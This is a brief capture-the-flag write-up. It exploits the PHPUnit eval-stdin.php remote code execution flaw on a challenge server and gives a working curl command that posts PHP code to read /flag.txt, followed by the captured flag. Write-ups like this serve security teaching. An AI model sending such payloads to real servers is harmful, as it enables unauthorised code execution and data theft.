## php-unit

Very clearly built with PHP. Not much going on so we run dirsearch to hopefully get something interesting.

```
python dirsearch.py <url>
```

In the `/composer.json` file we see the phpunit version (5.6.2), which is vulnerable on the `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` endpoint. 

We can either use cURL to send data:

```
curl <ip>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data "<?php readfile('/flag.txt'); ?>"
```

Or put `<?php readfile('/flag.txt'); ?>` straight in a BurpSuite request.

_CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}_